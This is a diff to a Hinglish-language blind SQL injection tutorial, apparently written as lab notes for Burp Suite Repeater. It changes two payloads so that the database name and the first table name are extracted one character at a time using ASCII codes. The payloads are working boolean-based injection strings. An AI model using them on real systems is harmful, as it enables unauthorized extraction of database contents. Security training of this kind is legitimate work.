@@ -277,7 +277,7 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 
 ### Database Name Character-by-Character Extract
 
-`id=1 AND SUBSTR(database(), 1, 1)='d'#`
+`id=1 AND ASCII(SUBSTR(database(), 1, 1))=100#`
 
 ### Finding Table Length 
 
@@ -289,7 +289,7 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 
 ### First Table Name Character-by-Character Extract
 
-`id=1 AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='g'#`
+`id=1 AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1))=103#`
 
 ### Finding Column Name Length
 
